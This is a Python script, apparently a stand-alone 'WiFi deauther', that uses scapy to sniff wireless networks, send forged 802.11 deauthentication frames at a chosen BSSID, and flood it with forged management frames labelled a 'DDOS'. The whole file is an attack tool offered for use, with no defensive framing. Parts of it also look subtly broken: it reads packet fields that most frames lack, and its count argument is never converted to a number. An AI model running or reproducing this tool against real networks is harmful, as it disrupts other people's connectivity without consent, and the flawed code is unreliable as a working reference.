import scapy.all as scapy
import argparse

def scan_wifi(interface):
    """Scan WiFi networks"""
    wifi_networks = scapy.sniff(iface=interface, count=10)
    for network in wifi_networks:
        if network.haslayer(scapy.Dot11):
            print(f"SSID: {network.info}, BSSID: {network.addr2}, Channel: {network.channel}")

def deauth_wifi(bssid, interface, count=1):
    """Deauth a WiFi network"""
    packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid) / scapy.Dot11Deauth(reason=7)
    scapy.sendp(packet, iface=interface, count=count, inter=0.1)

def ddos_wifi(bssid, interface, count=100):
    """DDOS a WiFi network"""
    packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=8, addr1=bssid, addr2=bssid, addr3=bssid) / scapy.Dot11QoS()
    scapy.sendp(packet, iface=interface, count=count, inter=0.1)

def main():
    parser = argparse.ArgumentParser(description='WiFi Deauther and Manipulator')
    parser.add_argument('-i', '--interface', help='Wireless interface to use', required=True)
    parser.add_argument('-b', '--bssid', help='BSSID of the WiFi network to target')
    parser.add_argument('-c', '--count', help='Number of packets to send (default: 1 for deauth, 100 for DDOS)')
    parser.add_argument('-d', '--deauth', action='store_true', help='Deauth the WiFi network')
    parser.add_argument('-D', '--ddos', action='store_true', help='DDOS the WiFi network')
    args = parser.parse_args()

    if args.deauth:
        deauth_wifi(args.bssid, args.interface, args.count)
    elif args.ddos:
        ddos_wifi(args.bssid, args.interface, args.count)
    else:
        scan_wifi(args.interface)

if __name__ == "__main__":
    main()
